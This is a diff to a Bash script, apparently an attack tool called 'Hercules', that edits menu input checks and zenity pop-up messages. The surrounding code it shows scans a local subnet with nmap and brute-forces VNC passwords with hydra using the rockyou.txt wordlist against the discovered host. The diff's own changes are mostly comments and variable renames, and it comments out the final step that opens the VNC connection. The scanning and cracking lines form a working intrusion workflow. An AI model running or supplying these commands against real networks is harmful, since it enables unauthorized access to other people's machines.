@@ -130,14 +130,18 @@ else
                 elif [[ " ${exit[*]} " == *" ${service} "* ]]; then
                     echo "Stopping program..."
                     sleep 1
-                    exit
+                
+                #checks if the user has put nothing into the input feild
                 elif [[ " ${empty[*]} " == *" ${service} "* ]]; then
                     echo -e "${RED}ERROR:${NC} plase input a number into the input field"
                     clear
                     Hercules
+                
+                #checks if the user has put in a letter insed of a number into the input feild
                 elif [[ " ${alphabet[*]} " == *" ${service} "* ]]; then
                     echo "Please enter a number next time"
                     exit 1
+
                 else
                     # Scan specific port
                     sudo nmap -sS 192.168.1.1/24 -p $service --open
@@ -168,21 +172,21 @@ else
                         # Crack VNC password
                         hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
                         # Alerts the user that the computer is trying to connect to the VNC server
-                        title="Connecting to ${user}"
-                        Connecting_To_VNC_SERVER="We are connecting you to ${user}. Please wait..."
+                        title="Connecting to ${host}"
+                        Connecting_To_VNC_SERVER="We are connecting you to '${host}'. Please wait..."
                         zenity --info --title="${title}" --text="${Connecting_To_VNC_SERVER}"
 
                         sleep 5
 
                         # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
                         # Notification for the user to see the computer is connected to the VNC server
-                        title="Enter password to ${user}"
-                        Connected_To_VNC_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
+                        title="Enter password to ${host}"
+                        Connected_To_VNC_SERVER="We have connected you to '${host}'. Please enter the password to '${host}'. to continue..."
                         zenity --info --title="${title}" --text="${Connected_To_VNC_SERVER}"
 
                         # Put the
                         echo "Loading VNC server..."
-                        open vnc://$host
+                        #open vnc://$host
                         exit
                     fi
                 fi
